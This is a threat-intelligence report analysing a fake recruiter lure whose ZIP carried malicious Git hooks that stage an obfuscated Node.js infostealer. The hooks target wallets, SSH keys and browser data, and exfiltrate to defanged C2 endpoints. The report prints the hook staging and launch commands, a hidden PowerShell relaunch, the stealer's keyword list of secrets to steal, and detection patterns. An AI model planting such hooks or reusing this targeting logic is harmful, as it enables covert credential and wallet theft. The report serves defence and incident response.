---
title: "AI-Powered RWA Finance Platform: Developer Review ZIP Uses Git Hooks to Stage a Tri-Port JavaScript Implant"
date: 2026-05-17
author: "ThreatProphet"
description: "Analysis of a recruitment-themed developer review lure that abused LimeWire file sharing to deliver an AI/RWA finance platform ZIP containing malicious Git hooks, cross-platform Node.js staging, and an obfuscated JavaScript implant with 8085/8086/8087 C2 roles."
tags:
  - fake-developer-recruitment
  - malicious-repository
  - git-hooks
  - javascript
  - node-js
  - socket-io
  - limewire
  - blockchain
  - web3
  - wallet-targeting
  - credential-harvesting
  - infostealer
categories:
  - malware-analysis
  - threat-intelligence
tlp: "CLEAR"
mitre_techniques:
  - T1566.003
  - T1204.002
  - T1059.001
  - T1059.003
  - T1059.004
  - T1059.007
  - T1105
  - T1071.001
  - T1027
  - T1036
  - T1082
  - T1083
  - T1005
  - T1033
  - T1552.001
  - T1555.003
  - T1041
report_id: "TP-2026-014"
showToc: true
---

> *"The dev branch was a threshold; crossing it woke the hook."*

## Executive Summary

This report analyzes a recruitment-themed malware delivery attempt that abused a developer review workflow. A LinkedIn recruiter persona using the name **Bill Johnson, CTS** sent the target a LimeWire file-sharing URL for an archive named `AI-Powered_RWA_Finance_Platform.zip`:

```text
hxxps://limewire[.]com/d/Fw4jF#TNRRfGHC7h
```

The lure framed the work as a review of an abandoned AI-powered real-world-asset finance platform. The actor claimed prior developers were poor at Git and pointed the reviewer at a repository snapshot where the `master` branch was incomplete. The repository README then instructed the reviewer to run:

```bash
git checkout dev
```

That instruction is the operational hinge of the case. The delivered ZIP contains a full Git repository snapshot, including active local Git hooks. This matters because local Git hooks are not normally transferred by a standard remote clone, but they are preserved when a full `.git/` directory is packaged inside a ZIP archive. The `post-checkout` hook and `pre-commit` hook copy a large obfuscated JavaScript payload into `$HOME/.vscode`, stage a package manifest, and launch platform-specific runners. On Linux and macOS, the runner uses Bash and Node.js. On Windows, it relaunches through a hidden PowerShell/CMD flow and runs the same JavaScript payload with Node.

The primary malicious JavaScript file is `.git/hooks/update.sample`, copied at runtime to `$HOME/.vscode/git-command`. It is 3,534,066 bytes and has SHA-256:

```text
ff74c38e95118029aed09900a2aa00f193a795d5c5311d7e01010f56d1532e11
```

Static deobfuscation recovered a multi-role C2 layout on `216.126.225[.]243`:

| Endpoint | Assessed Role |
|---|---|
| `hxxp://216.126.225[.]243:8085/upload` | Multipart file upload / exfiltration |
| `hxxp://216.126.225[.]243:8086/upload` | Host and event telemetry upload |
| `hxxp://216.126.225[.]243:8087` | API / Socket.IO-style channel |

The recovered payload logic includes host and WSL/Windows profiling, browser profile path enumeration, sensitive file and wallet keyword targeting, multipart upload logic using `FormData` and `fs.createReadStream`, and a Socket.IO/API-style channel. A subsequent marker-summary pass corroborated the same feature set across decoded payload artifacts, including `8085/upload`, `8086/upload`, `8087`, `u_k=501`, `t=5`, HMAC-style validation, Socket.IO, multipart form upload, browser-profile markers, wallet keywords, and WSL/Windows markers. A later bounded clipboard pass resolved the clipboard-related hits as dependency/UI/noise context rather than direct clipboard collection. The payload was **not executed** during this investigation, and no live callback or remote task body was captured.

The technical linkage from LinkedIn lure to LimeWire ZIP, Git-hook execution trigger, `$HOME/.vscode` staging, Node.js bootstrap, obfuscated JavaScript implant, and recovered C2 endpoints is assessed with **high confidence**. Attribution to a named activity set remains **low confidence**. The case strongly fits the broader fake developer recruitment pattern, and the `8085/8086/8087` service-role layout overlaps prior local ThreatProphet investigations and public reporting, but exact payload-hash reuse is not currently supported.

## Evidence Basis and Scope

This report is based on preserved LinkedIn and LimeWire screenshots, static ZIP inventory, Git metadata review, hook and runner script review, cryptographic hashes, static JavaScript deobfuscation, decoded string extraction, derived marker summaries, and passive OSINT against the recovered delivery and C2 infrastructure. The enrichment pass located the delivered ZIP archive but did not identify a separate extracted worktree, so archive-derived hook and payload evidence remains the primary basis for the report.

No Git hooks, runner scripts, package installs, Node.js payloads, C2 callbacks, exfiltration routines, Socket.IO channels, or malware behaviors were executed during analysis.

The public report provides defanged indicators, hashes, file names, execution paths, recovered strings, endpoint roles, and behavioral descriptions. Raw malware samples, local evidence paths, private pivots, and credentials are excluded.

**Legitimate-service notice:** LimeWire and Node.js infrastructure are treated as abused legitimate services or bootstrap infrastructure, not as malicious infrastructure owners. The malicious chain begins with the actor-provided ZIP and its embedded Git hooks.

Claims are separated into three categories:

- **Directly observed:** present in screenshots, the ZIP archive, Git metadata, hook files, runner files, package manifests, captured hashes, or decoded static artifacts.
- **Behavioral assessment:** inferred from recovered source logic, deobfuscated strings, and stable code context.
- **External/campaign context:** based on previous local investigations and public reporting, but not used alone to prove attribution.

## Key Findings

| Finding | Assessment |
|---|---|
| Initial access vector | LinkedIn recruiter persona delivered a LimeWire file-sharing link |
| Recruiter persona | `Bill Johnson, CTS` |
| Delivery URL | `hxxps://limewire[.]com/d/Fw4jF#TNRRfGHC7h` |
| Delivery platform status | LimeWire treated as abused legitimate file-sharing infrastructure |
| Delivered archive | `AI-Powered_RWA_Finance_Platform.zip` |
| Archive SHA-256 | `c9cf20405272789535242d4e4aa8342b5d74ce3d64e2529809dbace84324e8ef` |
| Lure theme | AI-powered RWA finance platform code review |
| Execution trigger | README instructs `git checkout dev`, which triggers `.git/hooks/post-checkout` |
| Archive validation | ZIP inventory confirms full `.git` directory and executable hook files |
| Local staging directory | `$HOME/.vscode` |
| Primary payload | `.git/hooks/update.sample` -> `$HOME/.vscode/git-command` |
| Payload SHA-256 | `ff74c38e95118029aed09900a2aa00f193a795d5c5311d7e01010f56d1532e11` |
| Linux/macOS runner | `.git/hooks/applypatch-msg.sample` |
| Windows runner | `.git/hooks/fsmonitor-watchman.sample` |
| C2 IP | `216.126.225[.]243` |
| C2 roles | `8085` file upload, `8086` telemetry, `8087` API/socket |
| Campaign markers | `u_k=501`, `t=5`, HMAC-style validation |
| Hosting | RouterHosting / Cloudzy PTR / IPinfo context; hosting provider is infrastructure context only |
| Attribution | High confidence for this delivery/staging chain; low confidence for any named actor/activity set |

---

## Attack Overview

### Initial Contact

The case began with a LinkedIn message from a recruiter persona named `Bill Johnson, CTS`. The message sent a LimeWire URL and framed the task as a code review of abandoned developer work. The preserved investigation notes indicate the lure claimed the previous developers were not good at Git and that development stopped three months earlier.

The delivery URL was:

```text
hxxps://limewire[.]com/d/Fw4jF#TNRRfGHC7h
```

The LimeWire page displayed a ZIP file named:

```text
AI-Powered_RWA_Finance_Platform.zip
```

The screenshot showed the ZIP as a 4.68 MB file shared by `vi3ab4psg7`, with an expiry banner visible on 2026-05-15.

### Repository Framing

The repository README presented `master` as an incomplete branch and told the reviewer that active development lived in `dev`. The key instruction was:

```bash
git checkout dev
```

In a normal repository, this would be an ordinary review step. In this archive, it activates `.git/hooks/post-checkout`, because the archive includes a complete `.git` directory with executable local hooks.

### Repository Metadata

The archive contains Git config user metadata for a user named `Ambi`. The email value is treated as artifact metadata rather than attribution proof and is not promoted as a public IOC in this report.

The Git reflog shows an initial commit, branch movement from `master` to `dev`, a `Version 1.0` commit, and later checkout activity. The branch setup supports the lure narrative: `master` appears intentionally positioned as an incomplete branch, while `dev` contains the content the reviewer is instructed to inspect. The local Git identity should be treated as artifact metadata and not as attribution evidence without corroboration.

### Kill Chain

```text
LinkedIn recruiter message
  -> LimeWire delivery URL
  -> AI-Powered_RWA_Finance_Platform.zip
  -> full Git repository snapshot with active local hooks
  -> README instructs reviewer to run git checkout dev
  -> .git/hooks/post-checkout executes after branch switch
  -> hook copies payload files into $HOME/.vscode
  -> hook launches platform-specific runner
  -> runner ensures Node.js and installs NPM dependencies
  -> runner executes $HOME/.vscode/git-command
  -> obfuscated JavaScript profiles host and developer environment
  -> payload targets browser profiles, wallet/secret keywords, and local files
  -> payload uses 216.126.225[.]243:8085/8086/8087 for upload, telemetry, and API/socket roles
```

---

## Technical Analysis

### Stage 0: Archive Delivery

The delivered archive hash is:

```text
c9cf20405272789535242d4e4aa8342b5d74ce3d64e2529809dbace84324e8ef  AI-Powered_RWA_Finance_Platform.zip
```

Static ZIP inventory confirmed a complete `.git` directory and executable hook files. This is materially different from an ordinary source export because it preserves local client-side hooks that can execute during routine Git workflows. Relevant hook entries included:

| File | Size | Mode | Role |
|---|---:|---|---|
| `.git/hooks/post-checkout` | 1,699 bytes | executable | Branch-switch trigger |
| `.git/hooks/pre-commit` | 1,601 bytes | executable | Secondary commit trigger |
| `.git/hooks/applypatch-msg.sample` | 5,209 bytes | executable | Linux/macOS runner |
| `.git/hooks/fsmonitor-watchman.sample` | 3,487 bytes | executable | Windows runner |
| `.git/hooks/pre-applypatch.sample` | 384 bytes | executable | Staged package manifest |
| `.git/hooks/update.sample` | 3,534,066 bytes | executable | Obfuscated JavaScript payload |

The names are significant. The payload is hidden under `update.sample`, which resembles a normal Git sample hook filename, but in this archive it is executable and is copied into the user's home directory by active hooks.

### Stage 1: Git Hook Execution Trigger

Both `post-checkout` and `pre-commit` preserve large blocks of normal sample-hook comment text before the malicious staging block. Execution depends on the user running Git operations inside the unpacked repository with executable hooks preserved by the archive extraction process. The active logic begins by identifying the platform and staging files under `$HOME/.vscode`:

```sh
uname_s="$(uname -s 2>/dev/null || echo unknown)"
VSCODE_DIR="$HOME/.vscode"
mkdir -p "$VSCODE_DIR"
SRC_DIR=".git/hooks"
cp -f "$SRC_DIR/update.sample" "$VSCODE_DIR/git-command"
cp -f "$SRC_DIR/pre-applypatch.sample" "$VSCODE_DIR/package.json"
```

On Linux and macOS, the hook stages and launches a shell runner:

```sh
cp -f "$SRC_DIR/applypatch-msg.sample" "$VSCODE_DIR/git-command.sh"
chmod +x "$VSCODE_DIR/git-command.sh"
nohup bash "$VSCODE_DIR/git-command.sh" > /dev/null 2>&1 &
```

On Windows-like Git environments, it stages and launches a command script:

```sh
cp -f "$SRC_DIR/fsmonitor-watchman.sample" "$VSCODE_DIR/git-command.cmd"
"$VSCODE_DIR/git-command.cmd"
```

The hook design creates two execution opportunities:

- `post-checkout` fires when the reviewer follows the README and switches branches.
- `pre-commit` fires if the reviewer edits the project and commits changes.

This is a developer-workflow execution mechanism: the malicious code does not need a package lifecycle hook or visible application entry point if the target follows the Git instructions.

### Stage 2: Local Staging Under `$HOME/.vscode`

The hook copies three core files into `$HOME/.vscode`:

| Staged Path | Source | Role |
|---|---|---|
| `$HOME/.vscode/git-command` | `.git/hooks/update.sample` | Obfuscated JavaScript implant |
| `$HOME/.vscode/package.json` | `.git/hooks/pre-applypatch.sample` | NPM dependency manifest |
| `$HOME/.vscode/git-command.sh` | `.git/hooks/applypatch-msg.sample` | Linux/macOS runner |
| `$HOME/.vscode/git-command.cmd` | `.git/hooks/fsmonitor-watchman.sample` | Windows runner |

The directory choice is not proof of persistence by itself, but it is operationally useful. `$HOME/.vscode` is developer-adjacent, plausible on target workstations, and outside the delivered repository directory. That means cleanup of the downloaded project may not remove the staged payload files.

### Persistence and Re-Execution Assessment

The current evidence does not show durable OS-level persistence such as scheduled tasks, LaunchAgents, systemd units, registry Run keys, startup-folder entries, or shell-profile modification. Persistence is instead workflow- and staging-oriented:

- the malicious hooks remain in the delivered repository until removed;
- `post-checkout` and `pre-commit` provide repeated execution opportunities during normal Git workflows;
- staged files under `$HOME/.vscode` or `%USERPROFILE%\.vscode` may remain after the original ZIP/project folder is deleted;
- the JavaScript implant can continue running while the spawned Node.js process remains active.

This should be described as **repository-resident re-execution and staged-file survivability**, not confirmed boot persistence.

A bounded persistence-context pass resolved the earlier Linux-persistence marker lead. The meaningful hits show background execution and runtime survivability rather than durable host persistence: the Linux/macOS hooks copy staged files into `$HOME/.vscode` and launch `git-command.sh` with `nohup`, while decoded payload material contains `child_process`, `spawn`, `detached`, `setInterval`, and runtime process-management strings. Other hits were false positives, such as `.profile` inside React profiler/runtime strings and `systemD` as part of a `systemDirs` variable used for Windows/WSL user-directory filtering. No bounded context currently shows cron, systemd unit creation, shell-profile modification, LaunchAgents, scheduled tasks, startup-folder writes, registry Run keys, or service installation.

### Stage 3: Linux and macOS Runner

The Linux/macOS runner checks for a global Node.js installation. If absent, it downloads a portable Node.js build from `nodejs.org`, extracts it under `$HOME/.vscode`, and uses that runtime.

The runner determines the latest Node.js release by requesting:

```text
hxxps://nodejs[.]org/dist/index.json
```

It then builds platform-specific URLs for macOS or Linux tarballs. If Node.js is available, it runs:

```sh
cd "$HOME/.vscode"
npm install --silent --no-progress --loglevel=error --fund=false
node "$HOME/.vscode/git-command"
```

If `npm` is only available from the extracted portable Node.js directory, the runner uses that local `npm` instead.

### Stage 4: Windows Runner

The Windows runner relaunches itself hidden through PowerShell:

```cmd
powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe ..."
```

It retrieves the latest Node.js version through PowerShell, downloads a Node.js MSI using either PowerShell or `curl`, extracts it with `msiexec`, installs NPM packages, and then runs:

```cmd
"%NODE_EXE%" "%USERPROFILE%\.vscode\git-command"
```

This gives the payload a cross-platform execution path across Linux, macOS, and Windows developer environments.

### Stage 5: Staged Package Manifest

The staged package manifest is copied from `.git/hooks/pre-applypatch.sample` to `$HOME/.vscode/package.json`. It includes dependencies consistent with HTTP communication, socket communication, possible clipboard access, and SQLite-backed local data parsing. A later bounded context pass confirmed the `clipboardy` dependency declaration but did not confirm direct clipboard read/write and exfiltration logic:

```json
{
  "name": "env",
  "version": "1.0.0",
  "dependencies": {
    "axios": "^1.10.0",
    "fs": "^0.0.1-security",
    "request": "^2.88.2",
    "clipboardy": "^4.0.0",
    "socket.io-client": "^4.8.1",
    "sql.js": "^1.13.0"
  }
}
```

The deeper JavaScript pass directly confirmed active dependency checks for:

```text
socket.io-client
sql.js
form-data
axios
```

It also recovered an internal dependency bootstrap command:

```text
npm install sql.js socket.io-client form-data axios --no-save --no-warnings --no-progress --loglevel silent
```

### Stage 6: Obfuscated JavaScript Implant

The primary payload is:

```text
ff74c38e95118029aed09900a2aa00f193a795d5c5311d7e01010f56d1532e11  update.sample
Size: 3,534,066 bytes
```

Static deobfuscation recovered imports and dependency usage including:

```text
os
fs
path
child_process
socket.io-client
sql.js
form-data
axios
crypto
```

The second decoder pass rebuilt a scope-aware decoder map, rewrote 13,824 decoder-wrapper call sites, folded 87 literal concatenations, and recovered 6,084 decoded strings. The generated decoded file is an analysis artifact and should not be treated as a clean runnable payload; the behavioral findings below come from stable literals, code context, and repeated markers.

Recovered top-level constants:

```text
u_s = "hxxp://216.126.225[.]243:8086/upload"
l_s = "hxxp://216.126.225[.]243:8085/upload"
s_s = "hxxp://216.126.225[.]243:8087"
u_k = 501
t = 5
```

Public/reporting form:

```text
u_s = hxxp://216.126.225[.]243:8086/upload
l_s = hxxp://216.126.225[.]243:8085/upload
s_s = hxxp://216.126.225[.]243:8087
```

### Host Profiling

The payload collects host identity and operating-system context:

```text
host: os.hostname()
os: os.type() + " " + os.release()
username: os.userInfo().username || "unknown"
```

Additional logic checks for WSL and Windows user context:

- `process.env.WSL_DISTRO_NAME`
- `/proc/version`
- strings including `microsoft` and `wsl`
- `cmd.exe /c echo %USERNAME%`
- Windows user discovery through `/mnt/c/Users`

This is consistent with developer-workstation targeting where the payload wants both the Linux/WSL environment and the underlying Windows user context.

### Browser, Wallet, and Sensitive File Targeting

The deeper pass recovered browser profile path construction and keyword arrays that materially raise confidence in browser, wallet, and local-secret targeting.

Recovered browser/profile families include:

```text
Google Chrome
Brave
Microsoft Edge
Opera
Opera GX
Vivaldi
Kiwi
Yandex
Iridium
Dragon
Comodo
SRWare Iron
AVG Browser
```

Recovered sensitive keyword families include:

```text
.keys
.key
database
.env
environment
config
.properties
.yaml
.yml
.toml
metamask
phantom
bitcoin
ethereum
trustwallet
coinbase
ledger
keyring
keychain
electrum
keystore
solflare
martian
petra
binance
okx
keplr
truffle
hardhat
privatekey
private_key
id_rsa
id_dsa
id_ecdsa
id_ed25519
seed
mnemonic
passphrase
recovery
secret
credentials
auth_token
account
```

The targeting is explicitly aligned with developer secrets, SSH keys, project configuration, crypto wallets, and browser-backed credential/session material.

### File Upload and Exfiltration Logic

The recovered upload logic builds a `FormData` object, iterates candidate files, creates file streams with `fs.createReadStream`, appends files under a `files` form field, and posts to:

```text
hxxp://216.126.225[.]243:8085/upload
```

The same routine builds per-file metadata consistent with:

```text
browserId
profileId
extensionId
originalFilename
file path metadata
```

It also computes a validation value using HMAC-SHA256-style logic over metadata and timestamp material, then sends the result with upload headers. The derived marker summary independently grouped this logic with `formdata_upload`, `hmac_validation`, and `c2_8085_upload` markers. This supports the assessment that port `8085` is a file upload or exfiltration service, not just a duplicate telemetry endpoint.

### Telemetry Upload Logic

The `8086/upload` endpoint is tied to host and event telemetry. Recovered telemetry fields include:

```text
ukey
t
host
os
username
message
level
data
timestamp
```

The upload routine uses `axios`, includes a `validation` header, and sets a 10,000 ms timeout. The derived marker summary also recovered `c2_8086_upload`, `ukey_501`, `t_5`, and `hmac_validation`, reinforcing the role assessment for this endpoint.

### Socket / API Follow-On Channel

The payload verifies or installs `socket.io-client`, defines an API/socket endpoint from `s_s`, and transforms the HTTP base into a WebSocket-style endpoint through HTTP-to-WS replacement logic.

Recovered endpoint:

```text
hxxp://216.126.225[.]243:8087
```

Recovered strings also reference host-information posting and successful host info submission. The derived marker summary recovered `c2_8087` and `socketio`, reinforcing the API/socket role assessment. No live server response or remote task body was captured because no malware callback was performed.

### Stage Assessment

This is not "single-stage" in a practical malware-analysis sense.

There is one delivered JavaScript payload file, but the recovered behavior is multi-component:

1. Git-hook staging and `$HOME/.vscode` placement.
2. Runtime dependency bootstrap.
3. Host and WSL/Windows profiling.
4. Browser/profile and sensitive-file discovery.
5. Multipart upload to port `8085`.
6. Event and host telemetry to port `8086`.
7. API/socket channel on port `8087`.

No additional remote second-stage body was safely downloaded or captured. The best wording is: **single delivered JavaScript implant with multi-module behavior and probable remote tasking capability**.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic | Notes |
|---|---|---|---|
| T1566.003 | Spearphishing via Service | Initial Access | LinkedIn was used to deliver the LimeWire ZIP link |
| T1204.002 | User Execution: Malicious File | Execution | The target is expected to review the ZIP and follow README Git instructions |
| T1059.001 | PowerShell | Execution | Windows runner uses PowerShell for hidden relaunch and Node.js download |
| T1059.003 | Windows Command Shell | Execution | Windows runner executes a CMD script |
| T1059.004 | Unix Shell | Execution | Linux/macOS runner uses Bash |
| T1059.007 | JavaScript | Execution | The staged implant is an obfuscated Node.js JavaScript file |
| T1105 | Ingress Tool Transfer | Command and Control | Runners can retrieve a Node.js runtime and package dependencies when local tooling is absent; `nodejs.org` is legitimate bootstrap infrastructure, not actor-owned C2 |
| T1071.001 | Web Protocols | Command and Control | HTTP endpoints are used for telemetry, upload, and API/socket setup |
| T1027 | Obfuscated Files or Information | Defense Evasion | The JavaScript payload is heavily obfuscated and hidden as a Git sample file |
| T1036 | Masquerading | Defense Evasion | Payload components are named as Git hook samples and staged as `git-command` files under `.vscode` |
| T1082 | System Information Discovery | Discovery | Hostname, OS type/release, username, WSL context, and Windows user context are collected |
| T1083 | File and Directory Discovery | Discovery | Browser profile paths and sensitive file candidates are enumerated |
| T1005 | Data from Local System | Collection | Local files, browser profile material, and developer secrets are targeted |
| T1033 | System Owner/User Discovery | Discovery | Username and Windows/WSL user context are recovered |
| T1552.001 | Credentials In Files | Credential Access | Keyword targeting includes keys, tokens, seeds, mnemonic material, SSH keys, and config files |
| T1555.003 | Credentials from Web Browsers | Credential Access | Browser profile and Chromium-family data paths are targeted |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Multipart file upload logic posts to the actor-controlled `8085/upload` endpoint |

`clipboardy` is present in staged dependencies, but bounded context did not confirm direct clipboard read/write and exfiltration behavior. The clipboard hits were dependency declarations, React/UI clipboard-event strings, Solidity build-artifact `copy` strings, or report/template text, so `T1115` is intentionally not mapped. Network-configuration discovery is likewise not mapped unless later analysis confirms interface, route, proxy, or equivalent network configuration collection.

---

## Infrastructure Analysis

### Delivery Infrastructure

| Indicator | Type | Notes |
|---|---|---|
| `hxxps://limewire[.]com/d/Fw4jF#TNRRfGHC7h` | URL | Delivery URL observed in LinkedIn lure |
| `limewire[.]com` | Domain | Legitimate file-sharing platform abused for delivery |
| `vi3ab4psg7` | Uploader identifier | LimeWire page showed the ZIP shared by this identifier |
| `AI-Powered_RWA_Finance_Platform.zip` | File | Delivered repository archive |

Passive domain observations for LimeWire showed GoDaddy registrar data, Cloudflare nameservers, Cloudflare A records, and Google Workspace/Gmail MX hosts. LimeWire should be treated as an abused legitimate service, not as campaign-owned infrastructure.

### Bootstrap Infrastructure

The runner scripts use `nodejs[.]org` to obtain Node.js if a usable local runtime is absent. This is bootstrap behavior and should not be interpreted as malicious ownership or participation by Node.js infrastructure.

### C2 Infrastructure

| Indicator | Type | Role |
|---|---|---|
| `216.126.225[.]243` | IPv4 | Recovered C2 host |
| `216.126.225[.]243:8085` | Host/port | Multipart file upload / exfiltration |
| `216.126.225[.]243:8086` | Host/port | Host and event telemetry |
| `216.126.225[.]243:8087` | Host/port | API / Socket.IO-style endpoint |
| `hxxp://216.126.225[.]243:8085/upload` | URL | File upload endpoint |
| `hxxp://216.126.225[.]243:8086/upload` | URL | Telemetry upload endpoint |
| `hxxp://216.126.225[.]243:8087` | URL | API/socket base |

Passive enrichment associated `216.126.225[.]243` with RouterHosting / Cloudzy-like infrastructure:

| Field | Value |
|---|---|
| RDAP network | `NET-216-126-225-0-1` |
| RDAP name | `ROUTERHOSTING` |
| Range | `216.126.225.0 - 216.126.225.255` |
| Registrant | `RouterHosting LLC` |
| IPinfo org | `AS14956 RouterHosting LLC` |
| PTR / hostname | `243.225.126.216.static.cloudzy.com` |
| Location in IPinfo | Ashburn, Virginia, US |

### Cross-Report and Public-Reporting Context

The exact primary JavaScript SHA-256 and delivered ZIP hash were not found in public/indexed searches or prior local ThreatProphet cases during the investigation pass. Correlation is therefore not exact-hash based.

The stronger correlation is service-pattern and schema-level: TP-2026-014 uses the same `8085/8086/8087` service-role layout observed in prior local cases and in public reporting on developer-lure malware. The recovered constants `u_k = 501` and `t = 5` also fit the broader campaign-key/type-marker pattern seen in adjacent tooling, although the values differ across cases.

| Report/source | Correlation point | Analytical weight |
|---|---|---|
| TP-2026-012, Estokkyam | Tri-port service-role layout and campaign-key/type-marker schema. Estokkyam used `ukey/userkey=303`, `t=3`; TP-2026-014 uses `u_k=501`, `t=5`. | Schema-level tooling overlap. Not exact campaign-value reuse. |
| TP-2026-008, Triple Fork | Similar `8085/8086/8087` role layout in a developer-lure malware chain. | Tooling-family context; infrastructure and sample hashes differ. |
| Snowkluster VS Code malware reporting | Public reporting described fake developer repositories, NPoint staging, VS Code/task-based execution, and `8085/8086/8087` HTTP role separation on different infrastructure. | External context for a broader tooling pattern, not direct infrastructure correlation. |
| Public LinkedIn OSINT lead | A public post independently referenced `216.126.225[.]243` in malicious recruiter activity. | Useful OSINT lead only; not primary evidence without preserved technical artifacts. |

The IPs and sample hashes differ across these comparisons, so this section should be read as **tooling/protocol-family overlap**, not proof of the same operator.

---

## Indicators of Compromise

> Indicators are defanged for public reporting. Hashes are exact.

### Network Indicators

| Indicator | Type | Role | Confidence |
|---|---|---|---|
| `hxxps://limewire[.]com/d/Fw4jF#TNRRfGHC7h` | URL | Delivery link | Medium |
| `216.126.225[.]243` | IPv4 | C2 host | High |
| `216.126.225[.]243:8085` | Host/port | File upload / exfiltration | High |
| `216.126.225[.]243:8086` | Host/port | Host/event telemetry | High |
| `216.126.225[.]243:8087` | Host/port | API/socket endpoint | High |
| `hxxp://216.126.225[.]243:8085/upload` | URL | Multipart file upload / exfiltration | High |
| `hxxp://216.126.225[.]243:8086/upload` | URL | Telemetry upload | High |
| `hxxp://216.126.225[.]243:8087` | URL | API/socket base | High |

### File and Payload Hashes

Hashes are preserved for researcher comparison with recovered archives, hook files, runners, package manifests, and decoded payload material. The underlying evidence package is not distributed with this public report.

| SHA-256 | Artifact | Role |
|---|---|---|
| `c9cf20405272789535242d4e4aa8342b5d74ce3d64e2529809dbace84324e8ef` | `AI-Powered_RWA_Finance_Platform.zip` | Delivered archive |
| `ff74c38e95118029aed09900a2aa00f193a795d5c5311d7e01010f56d1532e11` | `.git/hooks/update.sample` | Obfuscated Node.js payload |
| `a8fdcd9c3bdab96660358b86e059152badf8a7f28654231d1935ed1f2c2b3faa` | `.git/hooks/post-checkout` | Branch-switch execution trigger |
| `36ee9a46255432369cd804d074caedd9bd5832c907c1eb544a68cb53818c3d57` | `.git/hooks/pre-commit` | Commit execution trigger |
| `928eb2366272c539171f362fbc6139235874679bbf9b5146bf17525d21a9d21e` | `.git/hooks/applypatch-msg.sample` | Linux/macOS runner |
| `a364a6e51fea4f681365df3cddfbba5483f00048e74163aa738ac73b48db82d1` | `.git/hooks/fsmonitor-watchman.sample` | Windows runner |
| `017cb09cabd9c909e4fb06e8c668d2f89e472e103eda5230d98761a9f998bdb5` | `.git/hooks/pre-applypatch.sample` | Staged package manifest |

### Host Artifacts and Paths

| Artifact | Role |
|---|---|
| `.git/hooks/post-checkout` | Git hook trigger |
| `.git/hooks/pre-commit` | Git hook trigger |
| `.git/hooks/update.sample` | Obfuscated JavaScript payload source |
| `.git/hooks/pre-applypatch.sample` | Package manifest source |
| `.git/hooks/applypatch-msg.sample` | Linux/macOS runner source |
| `.git/hooks/fsmonitor-watchman.sample` | Windows runner source |
| `$HOME/.vscode/git-command` | Staged JavaScript payload |
| `$HOME/.vscode/package.json` | Staged package manifest |
| `$HOME/.vscode/git-command.sh` | Staged Linux/macOS runner |
| `$HOME/.vscode/git-command.cmd` | Staged Windows runner |
| `$HOME/.vscode/node-v*-linux-x64` | Possible portable Node.js extraction path |
| `$HOME/.vscode/node-v*-darwin-x64` | Possible portable Node.js extraction path |
| `%USERPROFILE%\.vscode\git-command` | Staged Windows JavaScript payload |
| `%USERPROFILE%\.vscode\git-command.cmd` | Staged Windows runner |

### Behavioral Strings

| String | Notes |
|---|---|
| `git checkout dev` | README instruction that triggers `post-checkout` |
| `npm install sql.js socket.io-client form-data axios --no-save --no-warnings --no-progress --loglevel silent` | Internal dependency bootstrap |
| `socket.io-client` | Socket/API dependency |
| `sql.js` | SQLite parsing dependency |
| `form-data` | Multipart upload dependency |
| `axios` | HTTP client dependency |
| `u_k = 501` | Recovered payload constant |
| `t = 5` | Recovered payload constant |
| `validation` | HMAC-style upload/telemetry validation header or token |
| `clipboardy` | Dependency declaration only in bounded context; no confirmed clipboard collection/exfiltration |

---

## Attribution Assessment

Assessed confidence: **low** for any named activity set.

This case is clearly aligned with the fake developer recruitment pattern: LinkedIn contact, Web3/finance project pretext, delivered repository archive, hidden developer-workflow execution, Node.js payload, browser/wallet/secret targeting, and C2 endpoints supporting file upload and Socket.IO-style communication.

However, the available evidence does not justify assigning the activity to a named actor from this case alone. The LinkedIn persona, LimeWire uploader identifier, and Git metadata may be actor-created, borrowed, fabricated, or otherwise abused. The exact delivered ZIP hash and primary JavaScript hash did not match known public reports or prior local samples during the investigation pass.

The strongest correlation is infrastructure-role and schema-level overlap: the `8085/8086/8087` layout, `u_k=501`, and `t=5` values fit a broader family of developer-lure JavaScript implants that use campaign-key/type-marker conventions and separated upload/telemetry/control endpoints. That raises confidence in tooling-family similarity, but it does not prove common control.

---

## Remediation and Hunting

### If You Opened the ZIP or Ran Git Commands

1. Isolate the workstation from the network.
2. Preserve process, shell, PowerShell, DNS, proxy, and EDR telemetry before cleanup.
3. Inspect the repository for `.git/hooks/post-checkout`, `.git/hooks/pre-commit`, and unexpected executable sample-hook files.
4. Check for staged files under `$HOME/.vscode` or `%USERPROFILE%\.vscode`.
5. Hunt for `git-command`, `git-command.sh`, `git-command.cmd`, and unexpected portable Node.js directories.
6. Review outbound traffic to `216.126.225[.]243` on ports `8085`, `8086`, and `8087`.
7. Rotate secrets that may have been present on the host, including browser-stored credentials, SSH keys, cloud tokens, Git platform tokens, npm tokens, API keys, and wallet seed/private-key material.
8. Audit GitHub, GitLab, Bitbucket, cloud, and wallet activity for unauthorized use.

### Network-Level Detection

Hunt for:

```text
216.126.225[.]243:8085
216.126.225[.]243:8086
216.126.225[.]243:8087
hxxp://216.126.225[.]243:8085/upload
hxxp://216.126.225[.]243:8086/upload
hxxp://216.126.225[.]243:8087
```

Additional patterns:

- Developer workstations making HTTP requests to IP-literal C2 on ports `8085`, `8086`, or `8087`.
- Node.js processes communicating with unknown IP-literal services.
- Multipart POSTs to `/upload` from developer endpoints.
- Socket.IO or WebSocket-style traffic to unknown infrastructure after opening a repository archive.
- Node.js downloads from `nodejs.org` immediately after Git checkout or commit activity.

### Host-Level Detection

Useful command-line and filesystem patterns:

```text
git checkout dev
.git/hooks/post-checkout
.git/hooks/pre-commit
.git/hooks/update.sample
$HOME/.vscode/git-command
$HOME/.vscode/package.json
$HOME/.vscode/git-command.sh
nohup bash "$HOME/.vscode/git-command.sh"
node "$HOME/.vscode/git-command"
powershell -WindowStyle Hidden
msiexec /a node-v*-x64.msi
%USERPROFILE%\.vscode\git-command
```

Defenders should treat delivered ZIP archives containing a full `.git` directory as higher risk than ordinary source-code bundles. Local Git hooks inside archives can execute during normal checkout, commit, merge, rebase, and push workflows. Standard repository review should include `.git/hooks/` inventory before running Git commands.

### Preventive Controls

- Review `.git/hooks/` before running Git commands in untrusted archives.
- Prefer disposable virtual machines for coding challenges from unknown recruiters.
- Avoid running `git checkout`, `git switch`, `git commit`, `git merge`, `git rebase`, or `git push` inside untrusted repositories on a primary workstation.
- Block or alert on hooks that copy files into `$HOME/.vscode` or run `nohup`, PowerShell, or Node.js.
- Alert when Node.js is downloaded and installed by scripts inside repository hook paths.
- Disable automatic trust of new workspaces in development tools where possible.

---

## Evidence Availability

